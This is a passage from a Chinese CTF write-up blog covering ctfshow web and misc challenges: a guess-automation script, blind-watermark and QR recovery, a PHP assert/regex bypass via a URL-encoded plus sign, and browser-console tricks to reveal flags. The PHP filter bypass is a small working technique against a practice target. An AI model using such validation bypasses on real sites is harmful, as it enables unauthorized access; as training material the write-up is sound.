class="number">192</span>),<span class="built_in">int</span>(max_loc[<span class="number">1</span>]/<span class="number">288</span>)<span class="comment">#为什么是192和288，因为大图去掉标题栏就是1920*2880</span></span><br><span class="line">        guess=<span class="string">&#x27;ABCDEFGHIJ&#x27;</span>[y]+<span class="string">&#x27;0123456789&#x27;</span>[x]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;guess:<span class="subst">&#123;guess&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment">#传答案</span></span><br><span class="line">        response=sess.get(url+<span class="string">&#x27;/submit?guess=&#x27;</span>+guess)</span><br><span class="line">        r=json.loads(response.text)</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;result&#x27;</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;guess right!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;guess wrong!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">31</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Round:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> answer_one(sess):</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                i=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="You-and-me"><a class="header-anchor" href="#You-and-me">¶</a>You and me</h2>
<p>也是盲水印, 这次需要另一个<a target="_blank" rel="noopener" href="https://github.com/chishaxie/BlindWaterMark">盲水印工具</a>, 安装依赖即可执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bwmforpy3.py decode you.png you_and_me.png flag.png</span><br></pre></td></tr></table></figure>
<h2 id="迅疾响应"><a class="header-anchor" href="#迅疾响应">¶</a>迅疾响应</h2>
<p>扫不出来?扫不出来就对了, 向你推荐<a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">qrazybox</a>, 二维码<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43513379/article/details/109203225">详解</a></p>
<p>New -&gt; Import from Image 导入之后 Tools -&gt; Extract QR information</p>
<p>flag只有一半, 在你详细了解过二维码之后, 你会知道填充是从右往左填充的, 而且纠错码会在数据之后. 既然没有别的方法了, 那就碰运气先删掉一部分的纠错码看看能不能将纠错机制部分删除, 拿到没有被纠错的部分</p>
<p>所以我把定时标志(Timing Pattern)左边的数据部分全部删掉了</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623193220629.png" alt="image-20240623193220629"></p>
<p>此时再做扫描就能得到flag, 真帅吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623193312895.png" alt="image-20240623193312895"></p>
<h2 id="打不开的图片"><a class="header-anchor" href="#打不开的图片">¶</a>打不开的图片</h2>
<p>没有文件头, 没有文件尾, 简直就是乱码</p>
<p>附件名字叫做misc5.5.png, 而叫做misc5.png的附件是&quot;你会异或吗&quot;的附件, 那可能就是对整个文件进行了什么操作导致正常图片变成了这样</p>
<p>观察后发现, 本题文件头部分的二进制反转后加一就可以得到一个PNG头</p>
<p>十六进制运算 -&gt; 二进制反转 -&gt; 加一 -&gt; 保存就可以看到flag</p>
<blockquote>
<p>似乎有个求反运算, 我现在在想为什么他能通过<code>X[i]=-X[i]</code>直接得到求反加一</p>
</blockquote>
<h1>简单题</h1>
<h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2>
<hr>
<h3 id="web2-c0me-t0-s1gn"><a class="header-anchor" href="#web2-c0me-t0-s1gn">¶</a>web2 c0me_t0_s1gn</h3>
<p>右键检查, 源码中还有两个提示:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ok you find something a part of flag :ctfshow&#123;We1c0me_ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>the page hide something you need use the god&#x27;s eye to find<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--and thre is a hint for another one: can can need 控制台(console)--&gt;</span></span><br></pre></td></tr></table></figure>
<p>控制台处输入对应函数即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try to run the function &quot;g1ve_flag()&quot;to get the flag!</span><br><span class="line"># t0_jo1n_u3_!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="驷马难追"><a class="header-anchor" href="#驷马难追">¶</a>驷马难追</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">              <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">              <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过测试, URL编码中的字母不会被check函数检测出来, 所以就是直接用加法即可: ``?num=114514%2b1805296`</p>
<h3 id="TapTapTap"><a class="header-anchor" href="#TapTapTap">¶</a>TapTapTap</h3>
<p>是一个网页小游戏, html没什么好看的, 直接看该游戏仅有的一个``habibiScript.js`</p>
<p>直接搜索alert, 似乎得到一个游戏结束的输出</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( gameEngine.<span class="property">levelNum</span> &gt; <span class="number">20</span>) &#123;</span><br><span class="line">      toolsBox.<span class="title function_">hidePage</span>(pagePlayArea);</span><br><span class="line">      toolsBox.<span class="title function_">showPage</span>(pageLevelPassed);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">atob</span>(<span class="string">&#x27;WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=&#x27;</span>));</span><br><span class="line">      <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="string">&#x27;WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">    gameEngine.<span class="title function_">updateLevel</span>(gameEngine.<span class="property">levelNum</span> + <span class="number">1</span>); <span class="comment">// Update level number in the game engine</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对其进行base64编码, 可以得到<code>Your flag is in /secret_path_you_do_not_know/secretfile.txt</code>, 打开就得到了flag</p>
<h3 id="传说之下-雾"><a class="header-anchor" href="#传说之下-雾">¶</a>传说之下(雾)</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Game</span> = <span class="keyword">new</span> <span class="title class_">Underophidian</span>(<span class="string">&#x27;gameCanvas&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> snakeAudio = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.snake-audio&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> gameMusic = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.game-music&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> gameButton = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.game-button&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>查看js, 会发现游戏这个对象直接摆在脸上是Game, 而 score 是里面的一个变量</p>
<p>所以 开始游戏-&gt;暂停-&gt;控制台输入<code>Game.score=3000</code>, 然后吃掉一个果子, 控制台就会出现flag</p>
<h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2>
<hr>
<h3 id="杂项签到"><a class="header-anchor" href="#杂项签到">¶</a>杂项签到</h3>
<p>用winhex打开然后搜索ctfshow即可得到flag</p>
<h3 id="损坏的压缩包"><a class="header-anchor" href="#损坏的压缩包">¶</a>损坏的压缩包</h3>
<p>winhex打开发现是PNG头,改成png后缀打开得到flag</p>
<h3 id="7-1-05"><a class="header-anchor" href="#7-1-05">¶</a>7.1.05</h3>
<p>下载的是一个游戏的存档文件, 鼠鼠不想做了</p>
<h3 id="黑丝白丝还有什么丝"><a class="header-anchor" href="#黑丝白丝还有什么丝">¶</a>黑丝白丝还有什么丝</h3>
<p>你是西格玛男人, 鉴定为摩斯电码, 白丝为<code>.</code>黑丝为<code>-</code>转场为空格, 解码之后变成全大写就可以交了</p>
<p>手搓如下: <code>.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</code></p>
<h3 id="我吐了你随意"><a class="header-anchor" href="#我吐了你随意">¶</a>我吐了你随意</h3>
<p>0宽隐写, 塞进0宽字符<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">解码工具</a>即可</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-caogou/">https://4reexile.github.io/article/ctfshow-caogou/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/%E9%9A%90%E5%86%99/">隐写</a><a class="post-meta__tags" href="/tags/PyJail/">PyJail</a><a class="post-meta__tags" href="/tags/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/">整形溢出</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E7%BB%B4%E7%A0%81/">二维码</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a><a class="post-meta__tags" href="/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/">盲水印</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-information-gathering/" title="Web入门_信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_信息收集</div></div></a></div><div class="next-post pull-right"><a href="/article/how-to-create-backdoor/" title="后门技术"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">后门技术</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/ctfshow-mengxin/" title="ctfshow_萌新"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-22</div><div class="title">ctfshow_萌新</div></div></a></div><div><a href="/article/ctfshow-webbasic-phpcve/" title="Web入门_phpCVE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">Web入门_phpCVE</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-2/" title="Web入门_php特性_2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_2</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-1/" title="Web入门_php特性_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-24</div><div class="title">Web入门_php特性_1</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-3/" title="Web入门_php特性_3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_3</div></div></a></div><div><a href="/article/ctfshow-webbasic-codeaudit/" title="Web入门_代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-08</div><div class="title">Web入门_代码审计</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">Web签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E7%9C%BC%E9%87%8C%E5%8F%AA%E6%9C%89"><span class="toc-number">1.2.</span> <span class="toc-text">我的眼里只有$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.3.</span> <span class="toc-text">抽老婆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%A8%80%E6%97%A2%E5%87%BA"><span class="toc-number">1.4.</span> <span class="toc-text">一言既出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell"><span class="toc-number">1.5.</span> <span class="toc-text">Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4"><span class="toc-number">1.6.</span> <span class="toc-text">化零为整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%B8%80%E5%B9%B8%E5%85%8D"><span class="toc-number">1.7.</span> <span class="toc-text">无一幸免</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%97%E5%8A%9B%E8%B6%85%E7%BE%A4"><span class="toc-number">1.8.</span> <span class="toc-text">算力超群</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%97%E5%8A%9B%E5%8D%87%E7%BA%A7"><span class="toc-number">1.9.</span> <span class="toc-text">算力升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyPytHon-P"><span class="toc-number">1.10.</span> <span class="toc-text">easyPytHon_P</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%8D%E5%9C%B0%E9%A3%98%E9%9B%B6"><span class="toc-number">1.11.</span> <span class="toc-text">遍地飘零</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8C%B6%E6%AD%87%E5%8C%BA"><span class="toc-number">1.12.</span> <span class="toc-text">茶歇区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E8%88%94%E7%94%B0"><span class="toc-number">1.13.</span> <span class="toc-text">小舔田?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSB%E6%8E%A2%E5%A7%AC"><span class="toc-number">1.14.</span> <span class="toc-text">LSB探姬</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Is-Not-Obfuscate"><span class="toc-number">1.15.</span> <span class="toc-text">Is_Not_Obfuscate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BE%99%E7%8F%A0NFT"><span class="toc-number">1.16.</span> <span class="toc-text">龙珠NFT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%9C%E4%B9%8B%E6%A0%85%E6%A0%8F"><span class="toc-number">2.1.</span> <span class="toc-text">谜之栅栏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E4%BC%9A%E6%95%B0%E6%95%B0%E5%90%97"><span class="toc-number">2.2.</span> <span class="toc-text">你会数数吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E4%BC%9A%E5%BC%82%E6%88%96%E5%90%97"><span class="toc-number">2.3.</span> <span class="toc-text">你会异或吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E4%B8%80%E5%88%86%E4%B8%BA%E4%BA%8C"><span class="toc-number">2.4.</span> <span class="toc-text">flag一分为二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E8%B0%81"><span class="toc-number">2.5.</span> <span class="toc-text">我是谁?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#You-and-me"><span class="toc-number">2.6.</span> <span class="toc-text">You and me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%85%E7%96%BE%E5%93%8D%E5%BA%94"><span class="toc-number">2.7.</span> <span class="toc-text">迅疾响应</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-number">2.8.</span> <span class="toc-text">打不开的图片</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">简单题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web2-c0me-t0-s1gn"><span class="toc-number">3.1.1.</span> <span class="toc-text">web2 c0me_t0_s1gn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A9%B7%E9%A9%AC%E9%9A%BE%E8%BF%BD"><span class="toc-number">3.1.2.</span> <span class="toc-text">驷马难追</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TapTapTap"><span class="toc-number">3.1.3.</span> <span class="toc-text">TapTapTap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B-%E9%9B%BE"><span class="toc-number">3.1.4.</span> <span class="toc-text">传说之下(雾)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0"><span class="toc-number">3.2.1.</span> <span class="toc-text">杂项签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">3.2.2.</span> <span class="toc-text">损坏的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-05"><span class="toc-number">3.2.3.</span> <span class="toc-text">7.1.05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E4%B8%9D%E7%99%BD%E4%B8%9D%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%9D"><span class="toc-number">3.2.4.</span> <span class="toc-text">黑丝白丝还有什么丝</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%90%90%E4%BA%86%E4%BD%A0%E9%9A%8F%E6%84%8F"><span class="toc-number">3.2.5.</span> <span class="toc-text">我吐了你随意</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>